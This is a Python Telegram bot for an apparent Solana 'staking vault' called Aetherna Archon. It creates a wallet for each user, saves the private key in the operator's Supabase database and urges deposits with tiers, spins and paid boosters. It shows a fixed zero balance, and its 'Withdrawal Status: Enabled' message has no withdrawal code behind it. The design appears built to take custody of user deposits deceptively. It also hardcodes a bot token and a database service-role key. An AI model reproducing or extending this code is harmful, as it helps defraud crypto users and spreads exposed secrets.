import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from solders.keypair import Keypair
import httpx

# ==================== CONFIGURATION ====================
TOKEN = "8994751164:AAEEvy62VMdyCuK5J0CjxRL8T_ooaUJ_EUo"
SUPABASE_URL = "https://pdnyicuqdwljilhvourf.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBkbnlpY3VxZHdsamlsaHZvdXJmIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODg1MjA0OSwiZXhwIjoyMDk0NDI4MDQ5fQ.koygeQu-B3eVfNs4RruKANRAFyYn9JgaVklOZuPhKQM"

bot = Bot(token=TOKEN)
dp = Dispatcher()

headers = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "return=representation"
}

# ==================== ASYNC CORE FUNCTIONS ====================
async def get_or_create_user(telegram_id):
    url = f"{SUPABASE_URL}/rest/v1/users?telegram_id=eq.{telegram_id}&select=*"
    
    async with httpx.AsyncClient(follow_redirects=True) as client:
        try:
            response = await client.get(url, headers=headers)
            user_data = response.json()
            
            if isinstance(user_data, list) and len(user_data) > 0:
                return user_data[0]['sol_address']
                
            new_wallet = Keypair()
            public_key = str(new_wallet.pubkey())
            private_key = str(new_wallet)
            
            payload = [{
                "telegram_id": str(telegram_id),
                "sol_address": public_key,
                "private_key": private_key,
                "sol_balance": 0.0,
                "display_balance": 0.0,
                "diamonds": 0
            }]
            
            post_url = f"{SUPABASE_URL}/rest/v1/users"
            await client.post(post_url, headers=headers, json=payload)
            return public_key
            
        except Exception as e:
            print(f"Database Error: {str(e)}")
            return "ERROR"

# ==================== BOT HANDLERS ====================
@dp.message(Command("start"))
async def send_welcome(message: types.Message):
    telegram_id = message.from_user.id
    public_key = await get_or_create_user(telegram_id)
    
    welcome_text = (
        "🪐 *WELCOME TO AETHERNA ARCHON VAULT* 🪐\n\n"
        "Architecting the premier sovereign Layer-1 Staking Protocol.\n\n"
        "💳 *Your Dedicated Staking Wallet:*\n"
        f"{public_key}\n\n"
        "⚡️ *Active Pool: Stake SOL to Earn $AetherPoint*\n"
        "• Free Tier: 1x Daily Multiplier\n"
        "• Archon Tier: 10x Multiplier + Whitelist\n"
        "• Whale Tier: 50x Multiplier + Discord Role Emas\n\n"
        "📌 _Top-up/Deposit SOL to your address to activate your node instantly._"
    )
    
    kb = [
        [types.KeyboardButton(text="📦 Quest & Premium"), types.KeyboardButton(text="🎰 Golden Spin")],
        [types.KeyboardButton(text="🏪 Archon Store"), types.KeyboardButton(text="💳 Wallet & Withdraw")]
    ]
    markup = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
    await message.answer(welcome_text, parse_mode='Markdown', reply_markup=markup)

@dp.message()
async def handle_menu(message: types.Message):
    if message.text == "📦 Quest & Premium":
        await message.answer("🔮 *AETHERNA PORTAL QUESTS* 🔮\n\n🟢 *Free Quests (1x Multiplier):*\n1. Follow our X Account\n2. Join our Telegram Alpha Channel\n\n🔥 *Premium Quest:*\n• Top-Up SOL to buy *Diamond Packs*.\n• Buy Booster in the Store to skyrocket your Points!", parse_mode='Markdown')
    elif message.text == "🎰 Golden Spin":
        await message.answer("🎰 *GOLDEN SPIN WHEEL* 🎰\n\nBurn your Points or buy Premium Spin tickets to play!\n\n❌ _You don't have any Spin Tickets left._", parse_mode='Markdown')
    elif message.text == "🏪 Archon Store":await message.answer("🏪 *ARCHON EXCLUSIVE STORE* 🏪\n\nUse your Diamond balance to unlock multipliers:\n\n⚡️ *5x Multiplier Booster (1 Day)*\n» Price: 50 Diamonds\n\n🛡 *Leaderboard Shield (24 Hours)*\n» Price: 150 Diamonds", parse_mode='Markdown')
    elif message.text == "💳 Wallet & Withdraw":
        await message.answer("💳 *ARCHON FINANCE GATEWAY* 💳\n\n• *Your Balance:* 0.00 SOL\n• *Your Diamonds:* 0 💎\n• *Your AetherPoints:* 0 pts\n\n🔓 *Withdrawal Status:* Enabled", parse_mode='Markdown')

async def main():
    print("Aetherna ASYNC Bot Berhasil Berjalan Kencang...")
    await dp.start_polling(bot, skip_updates=True)

asyncio.run(main())